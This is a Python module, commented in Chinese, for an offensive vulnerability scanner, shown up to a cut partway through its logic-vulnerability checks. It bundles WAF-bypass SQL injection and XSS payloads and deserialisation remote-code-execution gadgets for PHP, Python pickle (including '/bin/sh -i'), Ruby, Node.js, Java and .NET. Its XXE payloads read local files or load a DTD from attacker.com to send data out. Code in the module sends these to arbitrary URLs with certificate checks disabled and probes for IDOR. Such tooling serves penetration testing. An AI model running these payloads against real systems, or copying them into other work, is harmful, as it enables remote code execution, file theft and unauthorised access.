#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
advanced_vuln_scanner扫描器模块，提供相关漏洞和服务扫描功能。

模块功能：
    - 提供相关安全测试功能
    - 支持API调用和命令行使用
    - 与其他模块集成协作

注意事项：
    - 本模块仅用于授权的安全测试
    - 请勿用于非法用途
    - 使用前请确保已获得相关授权
"""
import json
import os
import re
import time
import uuid
from typing import Any, Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

import aiohttp
import asyncio

from utils.logger import log


@dataclass
class AdvancedVuln:
    """高阶漏洞"""
    vuln_id: str
    url: str
    vuln_type: str  # deserialization/xxe/idor/logic/race_condition/mass_assignment
    title: str = ""
    severity: str = "high"  # critical/high/medium/low
    parameter: str = ""
    method: str = "GET"
    evidence: str = ""
    payload: str = ""
    request_sample: str = ""
    response_sample: str = ""
    confidence: str = "medium"  # high/medium/low
    cvss_score: float = 0.0
    cwe_id: str = ""
    description: str = ""
    impact: str = ""
    remediation: str = ""
    poc: str = ""
    reproduction_steps: List[str] = field(default_factory=list)
    false_positive_notes: str = ""
    discovered_at: float = field(default_factory=time.time)
    tags: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        """执行相关操作。

            Returns:
            操作结果。
        """
        return {
            "vuln_id": self.vuln_id,
            "url": self.url,
            "vuln_type": self.vuln_type,
            "title": self.title,
            "severity": self.severity,
            "parameter": self.parameter,
            "method": self.method,
            "evidence": self.evidence,
            "payload": self.payload,
            "confidence": self.confidence,
            "cvss_score": self.cvss_score,
            "cwe_id": self.cwe_id,
            "description": self.description,
            "impact": self.impact,
            "remediation": self.remediation,
            "poc": self.poc,
            "reproduction_steps": self.reproduction_steps,
            "discovered_at": self.discovered_at,
            "tags": self.tags
        }


class AdvancedVulnScanner:
    """高阶漏洞扫描器"""

    def __init__(self, data_dir: str = "data/advanced_vulns"):
        """初始化AdvancedVulnScanner实例。

            Args:
            self: 类实例。
        """
        self.data_dir = data_dir
        self.vulns: Dict[str, AdvancedVuln] = {}
        os.makedirs(data_dir, exist_ok=True)
        self._load_vulns()

        # WAF绕过payload库
        self.waf_bypass_payloads = {
            "sql_injection": [
                "' OR 1=1--",
                "' OR 1=1#",
                "' OR 1=1/*",
                "1' OR '1'='1",
                "1) OR (1=1",
                "1 UNION SELECT NULL--",
                "1 UNION SELECT NULL,NULL--",
                "1 AND SLEEP(5)--",
                "1' AND SLEEP(5)--",
                "1; WAITFOR DELAY '0:0:5'--",
                "admin'--",
                "admin' #",
                "admin'/*",
                "' OR 'a'='a",
                "' OR 1=1 LIMIT 1--",
                "1' AND 1=1--",
                "1' AND 1=2--",
                "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
                "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
            ],
            "xss": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert(1)",
                "<body onload=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "<details open ontoggle=alert(1)>",
                "<marquee onstart=alert(1)>",
                "<object data=javascript:alert(1)>",
                "<embed src=javascript:alert(1)>",
                "<a href=javascript:alert(1)>click</a>",
                "<form><button formaction=javascript:alert(1)>",
                "<input onfocus=alert(1) autofocus>",
                "<select onfocus=alert(1) autofocus></select>",
                "<textarea onfocus=alert(1) autofocus></textarea>",
                "<keygen onfocus=alert(1) autofocus>",
                "<video><source onerror=alert(1)>",
                "<audio src=x onerror=alert(1)>",
                "<picture><source srcset=x onerror=alert(1)>",
                "<math><maction actiontype=statusline onclick=alert(1)>",
            ],
            "encoding_bypass": [
                # URL编码
                "%27%20OR%201%3D1--",
                # 双重URL编码
                "%2527%2520OR%25201%253D1--",
                # Unicode编码
                "%u0027 OR 1=1--",
                # HTML实体
                "&#39; OR 1=1--",
                # 十六进制
                "0x27 OR 1=1--",
                # 大小写混合
                "' oR 1=1--",
                "' Or 1=1--",
                # 注释绕过
                "'/*foo*/OR/*bar*/1=1--",
                # 空格替换
                "'/**/OR/**/1=1--",
                "'%09OR%091=1--",
                "'%0aOR%0a1=1--",
                "'%0dOR%0d1=1--",
                "'%0cOR%0c1=1--",
                # 括号绕过
                "'OR(1=1)--",
                "'OR(1)=1--",
                # 分块传输
                "1\r\n0\r\n\r\n",
            ],
            "parameter_pollution": [
                "?id=1&id=2",
                "?id=1%26id=2",
                "?id=1&id=2&id=3",
                "?id=1;id=2",
                "?id=1,id=2",
            ],
        }

        # 反序列化payload
        self.deserialization_payloads = {
            "php": [
                'O:8:"stdClass":0:{}',
                'O:8:"stdClass":1:{s:4:"test";s:4:"test";}',
                'a:1:{s:4:"test";s:4:"test";}',
                'a:2:{i:0;s:4:"test";i:1;s:4:"test";}',
                'O:14:"GuzzleHttp\\Psr7\\FnStream":2:{s:33:"\\u0000GuzzleHttp\\Psr7\\FnStream\\u0000methods";a:1:{s:5:"close";a:2:{i:0;O:23:"GuzzleHttp\\HandlerStack":3:{s:32:"\\u0000GuzzleHttp\\HandlerStack\\u0000handler";s:6:"system";s:30:"\\u0000GuzzleHttp\\HandlerStack\\u0000stack";a:1:{i:0;s:2:"id";}s:31:"\\u0000GuzzleHttp\\HandlerStack\\u0000cached";b:0;}i:1;s:7:"resolve";}}s:9:"_fn_close";a:2:{i:0;r:4;i:1;s:7:"resolve";}}',
            ],
            "java": [
                'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgAqY29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLllhbU1vZGVsAX-8JnLh3xQDAARMAApjb21wcmVzc2VkTAAKY29tcG9uZW50c3QAE1tMamF2YS9sYW5nL09iamVjdDtMAA9jb21wcmVzc2VkTWV0aG9kc3EAfgAGTAAWY29tcHJlc3NlZFN0YXRpY01ldGhvZHNxAH4ABkwADmRlY2xhcmluZ0NsYXNzdAASTGphdmEvbGFuZy9DbGFzcztMAAVmaWVsZHNxAH4ABkwACG1lbWJlcnNxAH4ABkwACG1ldGhvZHNxAH4ABkwACm5hbWVJbmZvc3EAfgABTAAGc2lnbmF0dXJlcQB+AAFMAA1zdXBlckNsYXNzTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAADHcIAAAAEAAAAAB4cHBwcHBwcHBwcHBweA==',
            ],
            "python": [
                'cos\nsystem\n(S"id"\ntR.',
                'cposix\nsystem\n(S"id"\ntR.',
                'csubprocess\ncheck_output\n(S"id"\ntR.',
                'cos\nsystem\n(S"/bin/sh -i"\ntR.',
                'cposix\nenviron\n(S"PATH"\ng0\n(S"/tmp"\ns.',
            ],
            "ruby": [
                '--- !ruby/object:Gem::Installer\n    i: x\n--- !ruby/object:Gem::SpecFetcher\n    i: x\n--- !ruby/object:Gem::Requirement\n  requirements:\n    - !ruby/object:Gem::Package::TarReader\n        io: &1 !ruby/object:Net::BufferedIO\n          io: &1 !ruby/object:Gem::Package::TarReader::Entry\n             read: 0\n             header: "abc"\n          debug_output: &1 !ruby/object:Net::WriteAdapter\n             socket: &1 !ruby/object:Gem::RequestSet\n                 sets: !ruby/object:Net::WriteAdapter\n                     socket: !ruby/module \'Kernel\'\n                     method_id: :system\n                 git_set: "id"\n             method_id: :resolve',
            ],
            "nodejs": [
                '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\',function(e,s){console.log(s)})}()"}',
                '{"shell":"_$$ND_FUNC$$_function(){return require(\'child_process\').execSync(\'id\').toString()}()"}',
            ],
            "dotnet": [
                'AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACZTeXN0ZW0uV2luZG93cy5Gb3Jtcy5PYmplY3REYXRhUHJvdmlkZXIAAAAGX2RhdGEJX2RhdGFUeXBlB19vYmplY3QHX2V4cHJlc3Npb24JBQAAAAJDAlN5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQUBAA1TeXN0ZW0uV2luZG93cy5Gb3Jtcy5PYmplY3REYXRhUHJvdmlkZXIrT2JqZWN0U3RhdGUBAAAACGNvbXBsZXRlZGVzZXJpYWxpemVkX2RhdGFfYnl0ZXNfYXJyYXlfYnl0ZXNfYXJyYXkAAAAJBQAAAAIDAAAACQAAAAkFAAAABQAAAAU=',
            ],
        }

        # XXE payload
        self.xxe_payloads = [
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo>&send;</foo>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><data>&file;</data>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">%remote;]><data>&send;</data>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
        ]

        # 逻辑漏洞检测点
        self.logic_vuln_checks = [
            {"name": "price_manipulation", "description": "价格篡改", "severity": "critical", "check": "modify_price"},
            {"name": "quantity_manipulation", "description": "数量篡改（负数/超大数）", "severity": "high", "check": "modify_quantity"},
            {"name": "coupon_reuse", "description": "优惠券重复使用", "severity": "high", "check": "reuse_coupon"},
            {"name": "race_condition_payment", "description": "支付竞态条件", "severity": "critical", "check": "race_payment"},
            {"name": "bypass_approval", "description": "绕过审批流程", "severity": "high", "check": "bypass_approval"},
            {"name": "infinite_loop_discount", "description": "无限叠加优惠", "severity": "high", "check": "stack_discount"},
            {"name": "email_verification_bypass", "description": "邮箱验证绕过", "severity": "medium", "check": "bypass_email_verify"},
            {"name": "password_reset_poisoning", "description": "密码重置投毒", "severity": "high", "check": "reset_poisoning"},
            {"name": "oauth_misconfiguration", "description": "OAuth配置错误", "severity": "high", "check": "oauth_misconfig"},
            {"name": "jwt_none_algorithm", "description": "JWT算法混淆（none）", "severity": "critical", "check": "jwt_none"},
        ]

    def _load_vulns(self):
        """从文件加载漏洞"""
        vulns_file = os.path.join(self.data_dir, "advanced_vulns.json")
        if os.path.exists(vulns_file):
            try:
                with open(vulns_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                for vid, vdata in data.items():
                    self.vulns[vid] = AdvancedVuln(
                        vuln_id=vdata["vuln_id"],
                        url=vdata.get("url", ""),
                        vuln_type=vdata.get("vuln_type", ""),
                        title=vdata.get("title", ""),
                        severity=vdata.get("severity", "high"),
                        parameter=vdata.get("parameter", ""),
                        method=vdata.get("method", "GET"),
                        evidence=vdata.get("evidence", ""),
                        payload=vdata.get("payload", ""),
                        confidence=vdata.get("confidence", "medium"),
                        cvss_score=vdata.get("cvss_score", 0),
                        cwe_id=vdata.get("cwe_id", ""),
                        description=vdata.get("description", ""),
                        impact=vdata.get("impact", ""),
                        remediation=vdata.get("remediation", ""),
                        poc=vdata.get("poc", ""),
                        reproduction_steps=vdata.get("reproduction_steps", []),
                        discovered_at=vdata.get("discovered_at", time.time()),
                        tags=vdata.get("tags", [])
                    )
            except Exception as e:
                log.error(f"加载高阶漏洞失败: {e}")

    def _save_vulns(self):
        """保存漏洞到文件"""
        vulns_file = os.path.join(self.data_dir, "advanced_vulns.json")
        try:
            data = {vid: v.to_dict() for vid, v in self.vulns.items()}
            with open(vulns_file, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2, default=str)
        except Exception as e:
            log.error(f"保存高阶漏洞失败: {e}")

    def _add_vuln(self, url: str, vuln_type: str, title: str,
                  severity: str = "high", parameter: str = "",
                  method: str = "GET", evidence: str = "", payload: str = "",
                  confidence: str = "medium", cwe_id: str = "",
                  description: str = "", impact: str = "", remediation: str = "",
                  poc: str = "", reproduction_steps: List[str] = None,
                  tags: List[str] = None) -> str:
        """添加漏洞"""
        vuln_id = f"adv-{uuid.uuid4().hex[:8]}"
        vuln = AdvancedVuln(
            vuln_id=vuln_id,
            url=url,
            vuln_type=vuln_type,
            title=title,
            severity=severity,
            parameter=parameter,
            method=method,
            evidence=evidence,
            payload=payload,
            confidence=confidence,
            cwe_id=cwe_id,
            description=description,
            impact=impact,
            remediation=remediation,
            poc=poc,
            reproduction_steps=reproduction_steps or [],
            tags=tags or []
        )
        self.vulns[vuln_id] = vuln
        self._save_vulns()
        log.info(f"发现高阶漏洞: {title} ({vuln_id})")
        return vuln_id

    # ===== 1. 反序列化漏洞检测 =====
    def scan_deserialization(self, url: str, parameter: str = "",
                               method: str = "GET", content_type: str = "") -> Dict[str, Any]:
        """检测反序列化漏洞"""
        log.info(f"检测反序列化漏洞: {url} 参数: {parameter}")
        results = []
        detected = False

        # 判断可能的反序列化类型
        deserialize_type = self._detect_deserialize_type(url, content_type, parameter)

        if not deserialize_type:
            return {"url": url, "detected": False, "reason": "未检测到反序列化入口", "results": []}

        payloads = self.deserialization_payloads.get(deserialize_type, [])
        if not payloads:
            return {"url": url, "detected": False, "reason": f"无{deserialize_type}类型payload", "results": []}

        async def test_payload(payload: str):
            try:
                timeout = aiohttp.ClientTimeout(total=15)
                headers = {"Content-Type": "application/x-www-form-urlencoded"}
                if deserialize_type in ["java", "dotnet"]:
                    headers["Content-Type"] = "application/octet-stream"
                elif deserialize_type == "php":
                    headers["Content-Type"] = "application/x-www-form-urlencoded"

                async with aiohttp.ClientSession(timeout=timeout) as session:
                    if method.upper() == "POST":
                        data = {parameter: payload} if parameter else payload
                        async with session.post(url, data=data, headers=headers, ssl=False) as resp:
                            text = await resp.text()
                            status = resp.status
                    else:
                        params = {parameter: payload} if parameter else {}
                        async with session.get(url, params=params, headers=headers, ssl=False) as resp:
                            text = await resp.text()
                            status = resp.status

                    # 检测反序列化成功的特征
                    success_indicators = [
                        "uid=", "gid=", "groups=",  # Linux id命令输出
                        "root:", "bin:", "daemon:",  # /etc/passwd内容
                        "[fonts]", "[extensions]",  # Windows win.ini
                        "Microsoft", "Windows",  # Windows标识
                        "Warning: unserialize", "unserialize()",  # PHP反序列化错误
                        "ClassNotFoundException", "InvalidClassException",  # Java反序列化错误
                        "pickle", "UnpicklingError",  # Python反序列化错误
                        "500", "Internal Server Error",  # 服务器错误（可能是反序列化异常）
                    ]

                    for indicator in success_indicators:
                        if indicator in text:
                            return {
                                "payload": payload[:100],
                                "status_code": status,
                                "detected": True,
                                "indicator": indicator,
                                "response_snippet": text[:500],
                                "confidence": "high" if indicator in ["uid=", "root:", "[fonts]"] else "medium"
                            }
                    return {"payload": payload[:100], "status_code": status, "detected": False}
            except Exception as e:
                return {"payload": payload[:100], "error": str(e), "detected": False}

        async def test_all():
            tasks = [test_payload(p) for p in payloads[:5]]
            return await asyncio.gather(*tasks)

        try:
            test_results = asyncio.run(test_all())
        except:
            # 同步回退
            import requests
            test_results = []
            for payload in payloads[:5]:
                try:
                    headers = {"Content-Type": "application/x-www-form-urlencoded"}
                    if method.upper() == "POST":
                        data = {parameter: payload} if parameter else payload
                        resp = requests.post(url, data=data, headers=headers, timeout=15, verify=False)
                    else:
                        params = {parameter: payload} if parameter else {}
                        resp = requests.get(url, params=params, headers=headers, timeout=15, verify=False)
                    text = resp.text
                    detected_flag = False
                    indicator_found = ""
                    for indicator in ["uid=", "root:", "[fonts]", "unserialize", "ClassNotFound", "pickle"]:
                        if indicator in text:
                            detected_flag = True
                            indicator_found = indicator
                            break
                    test_results.append({
                        "payload": payload[:100], "status_code": resp.status_code,
                        "detected": detected_flag, "indicator": indicator_found,
                        "response_snippet": text[:500],
                        "confidence": "high" if indicator_found in ["uid=", "root:", "[fonts]"] else "medium"
                    })
                except Exception as e:
                    test_results.append({"payload": payload[:100], "error": str(e), "detected": False})

        for result in test_results:
            if result.get("detected"):
                detected = True
                vid = self._add_vuln(
                    url=url,
                    vuln_type="deserialization",
                    title=f"{deserialize_type.upper()}反序列化漏洞",
                    severity="critical",
                    parameter=parameter,
                    method=method,
                    evidence=f"响应中包含: {result.get('indicator', '')}",
                    payload=result.get("payload", ""),
                    confidence=result.get("confidence", "medium"),
                    cwe_id="CWE-502",
                    description=f"目标存在{deserialize_type}反序列化漏洞，攻击者可以通过构造恶意序列化数据执行任意代码或读取敏感文件。",
                    impact="远程代码执行（RCE）、敏感文件读取、服务器完全控制",
                    remediation="1. 避免反序列化不可信数据；2. 使用白名单限制可反序列化的类；3. 升级存在已知反序列化漏洞的库；4. 使用安全的序列化格式（如JSON）",
                    poc=result.get("payload", ""),
                    reproduction_steps=[
                        f"1. 向 {url} 发送包含恶意{deserialize_type}序列化数据的请求",
                        f"2. 参数 {parameter} 的值设置为恶意payload",
                        "3. 观察响应，确认反序列化执行成功",
                        "4. 验证可执行任意命令或读取敏感文件"
                    ],
                    tags=["deserialization", "rce", deserialize_type, "critical"]
                )
                results.append(vid)

        return {
            "url": url,
            "deserialize_type": deserialize_type,
            "detected": detected,
            "vuln_count": len(results),
            "vuln_ids": results,
            "test_results": test_results
        }

    def _detect_deserialize_type(self, url: str, content_type: str, parameter: str) -> Optional[str]:
        """检测可能的反序列化类型"""
        url_lower = url.lower()
        content_lower = content_type.lower() if content_type else ""

        # PHP反序列化
        if ".php" in url_lower or "php" in content_lower:
            return "php"
        # Java反序列化
        if ".do" in url_lower or ".action" in url_lower or "java" in content_lower or "spring" in url_lower:
            return "java"
        # Python反序列化
        if ".py" in url_lower or "python" in content_lower or "django" in url_lower or "flask" in url_lower:
            return "python"
        # Node.js反序列化
        if "node" in content_lower or "express" in url_lower or "node-serialize" in content_lower:
            return "nodejs"
        # Ruby反序列化
        if ".rb" in url_lower or "ruby" in content_lower or "rails" in url_lower:
            return "ruby"
        # .NET反序列化
        if ".aspx" in url_lower or ".ashx" in url_lower or "asp.net" in content_lower:
            return "dotnet"

        # 根据参数值特征判断
        if parameter:
            if parameter.startswith("O:") or parameter.startswith("a:"):
                return "php"
            if parameter.startswith("rO0AB"):
                return "java"
            if "cos\n" in parameter or "cposix\n" in parameter:
                return "python"

        return None

    # ===== 2. XXE漏洞检测 =====
    def scan_xxe(self, url: str, parameter: str = "", method: str = "POST") -> Dict[str, Any]:
        """检测XXE漏洞"""
        log.info(f"检测XXE漏洞: {url}")
        results = []
        detected = False

        async def test_xxe_payload(payload: str):
            try:
                timeout = aiohttp.ClientTimeout(total=15)
                headers = {"Content-Type": "application/xml"}
                async with aiohttp.ClientSession(timeout=timeout) as session:
                    if method.upper() == "POST":
                        data = payload if not parameter else f"<root><{parameter}>{payload}</{parameter}></root>"
                        async with session.post(url, data=data, headers=headers, ssl=False) as resp:
                            text = await resp.text()
                            status = resp.status
                    else:
                        params = {parameter: payload} if parameter else {}
                        async with session.get(url, params=params, headers=headers, ssl=False) as resp:
                            text = await resp.text()
                            status = resp.status

                    # XXE成功特征
                    xxe_indicators = [
                        "root:", "bin:", "daemon:", "nobody:",  # /etc/passwd
                        "[fonts]", "[extensions]", "[mci extensions]",  # win.ini
                        "uid=", "gid=",  # id命令
                        "XML", "xml", "DOCTYPE", "ENTITY",  # XML相关
                        "failed to load external entity",  # libxml错误
                        "java.io.FileNotFoundException",  # Java XXE错误
                        "System.Xml.XmlException",  # .NET XXE错误
                    ]

                    for indicator in xxe_indicators:
                        if indicator in text:
                            return {
                                "payload": payload[:200],
                                "status_code": status,
                                "detected": True,
                                "indicator": indicator,
                                "response_snippet": text[:500],
                                "confidence": "high" if indicator in ["root:", "[fonts]", "uid="] else "medium"
                            }
                    return {"payload": payload[:200], "status_code": status, "detected": False}
            except Exception as e:
                return {"payload": payload[:200], "error": str(e), "detected": False}

        async def test_all():
            tasks = [test_xxe_payload(p) for p in self.xxe_payloads[:5]]
            return await asyncio.gather(*tasks)

        try:
            test_results = asyncio.run(test_all())
        except:
            import requests
            test_results = []
            for payload in self.xxe_payloads[:5]:
                try:
                    headers = {"Content-Type": "application/xml"}
                    if method.upper() == "POST":
                        resp = requests.post(url, data=payload, headers=headers, timeout=15, verify=False)
                    else:
                        resp = requests.get(url, headers=headers, timeout=15, verify=False)
                    text = resp.text
                    detected_flag = False
                    indicator_found = ""
                    for indicator in ["root:", "[fonts]", "uid=", "external entity", "FileNotFound"]:
                        if indicator in text:
                            detected_flag = True
                            indicator_found = indicator
                            break
                    test_results.append({
                        "payload": payload[:200], "status_code": resp.status_code,
                        "detected": detected_flag, "indicator": indicator_found,
                        "response_snippet": text[:500],
                        "confidence": "high" if indicator_found in ["root:", "[fonts]", "uid="] else "medium"
                    })
                except Exception as e:
                    test_results.append({"payload": payload[:200], "error": str(e), "detected": False})

        for result in test_results:
            if result.get("detected"):
                detected = True
                vid = self._add_vuln(
                    url=url,
                    vuln_type="xxe",
                    title="XML外部实体注入（XXE）漏洞",
                    severity="high",
                    parameter=parameter,
                    method=method,
                    evidence=f"响应中包含: {result.get('indicator', '')}",
                    payload=result.get("payload", ""),
                    confidence=result.get("confidence", "medium"),
                    cwe_id="CWE-611",
                    description="目标存在XML外部实体注入漏洞，攻击者可以通过构造恶意XML读取服务器敏感文件、进行SSRF攻击或执行远程代码。",
                    impact="敏感文件读取（/etc/passwd、配置文件、源代码）、SSRF内网探测、远程代码执行（特定条件下）、拒绝服务",
                    remediation="1. 禁用XML外部实体和DTD处理；2. 使用JSON等安全的数据格式；3. 升级XML解析库到最新版本；4. 配置XML解析器只处理内部实体",
                    poc=result.get("payload", ""),
                    reproduction_steps=[
                        f"1. 向 {url} 发送Content-Type为application/xml的POST请求",
                        "2. 请求体包含恶意DOCTYPE和ENTITY定义",
                        "3. 观察响应，确认外部实体被解析",
                        "4. 验证可读取/etc/passwd或其他敏感文件"
                    ],
                    tags=["xxe", "file_read", "ssrf", "high"]
                )
                results.append(vid)

        return {
            "url": url,
            "detected": detected,
            "vuln_count": len(results),
            "vuln_ids": results,
            "test_results": test_results
        }

    # ===== 3. IDOR/越权漏洞检测 =====
    def scan_idor(self, url: str, parameter: str, user1_cookie: str = "",
                   user2_cookie: str = "", method: str = "GET") -> Dict[str, Any]:
        """检测IDOR/越权漏洞（需要两个用户的凭证）"""
        log.info(f"检测IDOR/越权漏洞: {url} 参数: {parameter}")
        results = []
        detected = False

        if not user1_cookie or not user2_cookie:
            return {
                "url": url,
                "detected": False,
                "reason": "需要两个用户的凭证（Cookie/Token）才能检测IDOR",
                "results": []
            }

        # 解析URL获取参数
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if parameter not in params:
            return {
                "url": url,
                "detected": False,
                "reason": f"URL中未找到参数 {parameter}",
                "results": []
            }

        original_value = params[parameter][0]

        async def test_idor():
            try:
                timeout = aiohttp.ClientTimeout(total=15)
                headers1 = {"Cookie": user1_cookie}
                headers2 = {"Cookie": user2_cookie}

                async with aiohttp.ClientSession(timeout=timeout) as session:
                    # 用户1访问自己的资源
                    async with session.get(url, headers=headers1, ssl=False) as resp:
                        user1_own = await resp.text()
                        user1_own_status = resp.status

                    # 用户2访问用户1的资源
                    async with session.get(url, headers=headers2, ssl=False) as resp:
                        user2_access = await resp.text()
                        user2_status = resp.status

                    # 修改参数值测试
                    modified_params = params.copy()
                    # 尝试常见的ID值变化
                    test_values = []
                    try:
                        orig_id = int(original_value)
                        test_values = [str(orig_id - 1), str(orig_id + 1), "1", "2", "100"]
                    except:
                        test_values = [original_value + "_test", "admin", "test", "1"]

                    idor_detected = False
                    evidence = ""

                    # 比较用户1和用户2的响应
                    if user1_own_status == 200 and user2_status == 200:
                        # 如果两个用户都能访问同一资源，可能存在IDOR
                        similarity = self._calculate_similarity(user1_own, user2_access)
                        if similarity > 0.8:
                            idor_detected = True
                            evidence = f"用户1和用户2都能访问同一资源，响应相似度{similarity:.2f}"

                    # 测试修改后的参数
                    for test_val in test_values[:3]:
                        modified_params[parameter] = [test_val]
                        modified_query = urlencode(modified_params, doseq=True)
                        modified_url = urlunparse(parsed._replace(query=modified_query))

                        async with session.get(modified_url, headers=headers2, ssl=False) as resp:
                            modified_resp = await resp.text()
                            modified_status = resp.status

                        if modified_status == 200 and len(modified_resp) > 100:
                            # 检查是否返回了其他用户的数据
                            if "error" not in modified_resp.lower() and "not found" not in modified_resp.lower():
                                idor_detected = True
                                evidence = f"修改参数{parameter}={test_val}后仍能访问，状态码{modified_status}"
                                break

                    return {
                        "detected": idor_detected,
                        "evidence": evidence,
                        "user1_status": user1_own_status,
                        "user2_status": user2_status,
                        "original_value": original_value,
                        "tested_values": test_values[:3]
                    }
            except Exception as e:
                return {"detected": False, "error": str(e)}

        try:
            result = asyncio.run(test_idor())
        except:
            import requests
            result = {"detected": False, "error": "asyncio failed"}

        if result.get("detected"):
            detected = True
            vid = self._add_vuln(
                url=url,
                vuln_type="idor",
                title=f"不安全的直接对象引用（IDOR）/越权访问漏洞 - 参数{parameter}",
                severity="high",
                parameter=parameter,
                method=method,
                evidence=result.get("evidence", ""),
                confidence="medium",
                cwe_id="CWE-639",
                description=f"目标存在IDOR/越权访问漏洞，参数{parameter}未进行权限验证，攻击者可以通过修改参数值访问其他用户的资源。",
                impact="未授权访问其他用户数据、信息泄露、数据篡改、账户接管",
                remediation="1. 对每个对象访问进行权限验证；2. 使用不可预测的对象标识符（UUID）；3. 实施间接对象引用映射；4. 记录和监控异常的对象访问",
                reproduction_steps=[
                    f"1. 用用户1登录，访问 {url}",
                    f"2. 记录参数 {parameter} 的值和响应内容",
                    f"3. 用用户2登录，访问相同的URL",
                    "4. 如果用户2能看到用户1的数据，说明存在IDOR",
                    f"5. 尝试修改参数 {parameter} 的值为其他用户的ID，验证越权访问"
                ],
                tags=["idor", "broken_access_control", "privilege_escalation", "high"]
            )
            results.append(vid)

        return {
            "url": url,
            "parameter": parameter,
            "detected": detected,
            "vuln_count": len(results),
            "vuln_ids": results,
            "test_result": result
        }

    def _calculate_similarity(self, text1: str, text2: str) -> float:
        """计算两个文本的相似度（简化版）"""
        if not text1 or not text2:
            return 0.0
        # 使用简单的字符级相似度
        set1 = set(text1[:1000])
        set2 = set(text2[:1000])
        if not set1 or not set2:
            return 0.0
        intersection = len(set1 & set2)
        union = len(set1 | set2)
        return intersection / union if union > 0 else 0.0

    # ===== 4. 逻辑漏洞检测框架 =====
    def scan_logic_vulnerabilities(self, url: str, context: Dict[str, Any] = None) -> Dict[str, Any]:
        """逻辑漏洞检测框架（基于上下文的检测点检查）"""
        log.info(f"检测逻辑漏洞: {url}")
        results = []
        detected_checks = []

        context = context or {}

        for check in self.logic_vuln_checks:
            check_name = check["name"]
            check_type = check["check"]

            # 根据上下文判断是否适用
            applicable = self._is_logic_check_applicable(check_type, url, context)
            if not applicable:
                continue

            # 执行检测（简化实现，实际需要更复杂的逻辑）
            detected, evidence = self._execute_logic_check(check_type, url, context)

            if detected:
                detected_checks.append(check_name)
                vid = self._add_vuln(
                    url=url,
                    vuln_type="logic",
                    title=f"业务逻辑漏洞: {check['description']}",
                    severity=check["severity"],
                    confidence="low",  # 逻辑漏洞需要人工确认
                    cwe_id="CWE-840",
                    description=f"目标可能存在{check['description']}业务逻辑漏洞，需要人工验证确认。",
                    impact=check.get("impact", "业务逻辑被绕过，可能导致经济损失或安全边界被突破"),
                    remediation=check.get("remediation", "1. 审查业务流程的每个环节；2. 实施服务器端验证；3. 添加事务和锁机制；4. 记录和监控异常业务操作"),
                    reproduction_steps=[
                        f"1. 分析 {url} 的业务流程",
                        f"2. 尝试{check['description']}",
                        "3. 验证业务逻辑是否被绕过",
                        "4. 确认漏洞的实际影响"
                    ],
                    tags=["logic_vulnerability", "business_logic", check_name, check["severity"]]
                )
                results.append(vid)

        return {
            "url": url,
            "checked_count": len(self.logic_vuln_checks),
            "applicable_count": sum(1 for c in self.logic_vuln_checks if self._is_logic_check_applicable(c["check"], url, context)),
            "detected_count": len(detected_checks),
            "detected_checks": detected_checks,
            "vuln_ids": results,
            "note": "逻辑漏洞检测结果置信度较低，需要人工验证确认"
        }

    def _is_logic_check_applicable(self, check_type: str, url: str, context: Dict[str, Any]) -> bool:
        """判断逻辑漏洞检测点是否适用"""
        url_lower = url.lower()
        context_str = json.dumps(context).lower()

        applicability = {
            "modify_price": any(k in url_lower or k in context_str for k in ["price", "amount", "cost", "pay", "order", "cart", "checkout"]),
            "modify_quantity": any(k in url_lower or k in context_str for k in ["quantity", "qty", "count", "number", "order", "cart"]),
